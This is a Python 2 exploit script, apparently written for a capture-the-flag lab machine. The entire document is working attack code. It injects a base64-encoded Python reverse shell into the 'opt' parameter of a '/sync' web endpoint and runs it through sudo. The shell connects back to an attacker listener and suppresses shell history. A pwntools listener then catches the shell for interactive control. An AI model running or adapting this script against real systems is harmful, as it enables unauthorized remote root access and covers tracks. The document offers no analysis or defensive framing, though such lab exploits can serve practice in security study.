#!/usr/bin/env python2
import base64
import signal, thread
import requests, urllib
from pwn import *
signal.signal(signal.SIGINT, signal.SIG_DFL)

LHOST="10.10.14.43"
LPORT=60001
RHOST="10.10.10.69"
RPORT=80

PAYLOAD = "/usr/bin/python3 -c \"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"+str(LHOST)+"',"+str(LPORT)+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();\""

class NoEncodingSession(requests.Session):
    def send(self, *a, **kw):
        # a[0] is prepared request
        a[0].url = urllib.unquote(a[0].url)
        return requests.Session.send(self, *a, **kw)

def send_shell_payload():
    encoded_payload = "\\".join(base64.b64encode(PAYLOAD))
    log.info("http://"+str(RHOST)+":"+str(RPORT)+"/sync?opt=' sudo /home/themiddle/.monit cmd "+encoded_payload+"'")
    try:
        log.info("I am sending the encoded payload for you...")
        client = NoEncodingSession()
        client.keep_alive = False
        url = "http://"+str(RHOST)+":"+str(RPORT)+"/sync"
        response = client.get(url, params="opt=' sudo /home/themiddle/.monit cmd "+encoded_payload+"'")
        print("STATUS CODE: "+str(response.status_code))
        print(response.text)
    except requests.exceptions.RequestException as e:
        log.failure(str(e))
    finally:
        if client:
            client.close()

try:
    threading.Thread(target=send_shell_payload).start()
except Exception as e:
    log.error(str(e))
shell = listen(LPORT, timeout=10).wait_for_connection()
if shell.sock is None:
    log.failure("Connection timeout.")
    sys.exit()
shell.interactive()
sys.exit()
